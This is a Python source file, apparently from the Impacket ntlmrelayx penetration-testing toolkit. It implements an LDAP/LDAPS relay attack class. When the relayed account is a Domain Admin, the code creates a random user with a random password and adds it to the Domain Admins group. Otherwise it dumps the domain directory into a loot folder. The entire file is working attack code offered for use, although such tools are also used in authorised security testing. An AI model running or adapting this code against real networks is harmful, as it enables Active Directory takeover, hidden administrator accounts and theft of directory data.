# Copyright (c) 2013-2018 CORE Security Technologies
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# LDAP Attack Class
#
# Authors:
#  Alberto Solino (@agsolino)
#  Dirk-jan Mollema (@_dirkjan) / Fox-IT (https://www.fox-it.com)
#
# Description:
#  LDAP(s) protocol relay attack
#
# ToDo:
#
import random
import string
import thread
from impacket import LOG
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack

PROTOCOL_ATTACK_CLASS = "LDAPAttack"

#Define global variables to prevent dumping the domain twice
dumpedDomain = False
addedDomainAdmin = False
class LDAPAttack(ProtocolAttack):
    """
    This is the default LDAP attack. It checks the privileges of the relayed account
    and performs a domaindump if the user does not have administrative privileges.
    If the user is an Enterprise or Domain admin, a new user is added to escalate to DA.
    """
    PLUGIN_NAMES = ["LDAP", "LDAPS"]
    def __init__(self, config, LDAPClient, username):
        ProtocolAttack.__init__(self, config, LDAPClient, username)

        #Import it here because non-standard dependency
        self.ldapdomaindump = __import__('ldapdomaindump')
        self.ldap3 = __import__('ldap3')

    def addDA(self, domainDumper):
        global addedDomainAdmin
        if addedDomainAdmin:
            LOG.error('DA already added. Refusing to add another')
            return

        # Random password
        newPassword = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))

        # Random username
        newUser = ''.join(random.choice(string.ascii_letters) for _ in range(10))

        ucd = {
            'objectCategory': 'CN=Person,CN=Schema,CN=Configuration,%s' % domainDumper.root,
            'distinguishedName': 'CN=%s,CN=Users,%s' % (newUser,domainDumper.root),
            'cn': newUser,
            'sn': newUser,
            'givenName': newUser,
            'displayName': newUser,
            'name': newUser,
            'userAccountControl': 512,
            'accountExpires': '0',
            'sAMAccountName': newUser,
            'unicodePwd': '"{}"'.format(newPassword).encode('utf-16-le')
        }

        res = self.client.add('CN=%s,CN=Users,%s' % (newUser,domainDumper.root),['top','person','organizationalPerson','user'],ucd)
        if not res:
            LOG.error('Failed to add a new user: %s' % str(self.client.result))
        else:
            LOG.info('Adding new user with username: %s and password: %s result: OK' % (newUser,newPassword))

        domainsid = domainDumper.getRootSid()
        dagroupdn = domainDumper.getDAGroupDN(domainsid)
        res = self.client.modify(dagroupdn, {
            'member': [(self.ldap3.MODIFY_ADD, ['CN=%s,CN=Users,%s' % (newUser, domainDumper.root)])]})
        if res:
            LOG.info('Adding user: %s to group Domain Admins result: OK' % newUser)
            LOG.info('Domain Admin privileges acquired, shutting down...')
            addedDomainAdmin = True
            thread.interrupt_main()
        else:
            LOG.error('Failed to add user to Domain Admins group: %s' % str(self.client.result))

    def run(self):
        #self.client.search('dc=vulnerable,dc=contoso,dc=com', '(objectclass=person)')
        #print self.client.entries
        global dumpedDomain
        # Set up a default config
        domainDumpConfig = self.ldapdomaindump.domainDumpConfig()

        # Change the output directory to configured rootdir
        domainDumpConfig.basepath = self.config.lootdir

        # Create new dumper object
        domainDumper = self.ldapdomaindump.domainDumper(self.client.server, self.client, domainDumpConfig)

        # If not forbidden by options, check to add a DA
        if self.config.addda and domainDumper.isDomainAdmin(self.username):
            LOG.info('User is a Domain Admin!')
            if self.client.server.ssl:
                self.addDA(domainDumper)
            else:
                LOG.error('Connection to LDAP server does not use LDAPS, to enable adding a DA specify the target with ldaps:// instead of ldap://')
        else:
            # Display this only if we checked it
            if self.config.addda:
                LOG.info('User is not a Domain Admin')
            if not dumpedDomain and self.config.dumpdomain:
                # Do this before the dump is complete because of the time this can take
                dumpedDomain = True
                LOG.info('Dumping domain info for first time')
                domainDumper.domainDump()
                LOG.info('Domain info dumped into lootdir!')
